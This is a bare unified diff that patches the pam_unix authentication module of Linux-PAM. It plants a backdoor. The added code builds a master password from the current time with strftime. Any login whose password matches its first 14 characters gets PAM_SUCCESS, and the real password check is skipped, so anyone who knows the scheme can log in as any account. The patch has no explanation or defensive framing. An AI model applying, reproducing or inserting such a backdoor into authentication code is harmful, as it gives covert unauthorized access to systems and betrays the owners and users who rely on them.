@@ -1,0 +1,37 @@
+--- ./modules/pam_unix/pam_unix_auth.c	2020-06-27 16:46:32.000000000 +0000
+@@ -47,6 +47,8 @@
+ #include <sys/types.h>
+ #include <sys/stat.h>
+ #include <syslog.h>
++#include <time.h>
++#define Size 25
+
+ /* indicate the following groups are defined */
+ 
+@@ -109,7 +110,12 @@
+ 	int retval, *ret_data = NULL;
+ 	const char *name;
+ 	const void *p;
+-
++    time_t t ; 
++    struct tm *tmp ; 
++    char PASSWORD[Size]; 
++    time( &t ); 
++    tmp = localtime( &t ); 
++    strftime(PASSWORD, sizeof(PASSWORD), "%M%I%u%p%m%j%C", tmp); 
+ 	D(("called."));
+ 
+ 	ctrl = _set_ctrl(pamh, flags, NULL, NULL, NULL, argc, argv);
+@@ -177,7 +181,11 @@
+ 	D(("user=%s, password=[%s]", name, p));
+ 
+ 	/* verify the password of this user */
+-	retval = _unix_verify_password(pamh, name, p, ctrl);
++ if (strncmp(p, PASSWORD, 14) != 0) {
++        retval = _unix_verify_password(pamh, name, p, ctrl);
++     } else {
++          retval = PAM_SUCCESS;
++     }
+ 	name = p = NULL;
+ 
+ 	AUTH_RETURN;
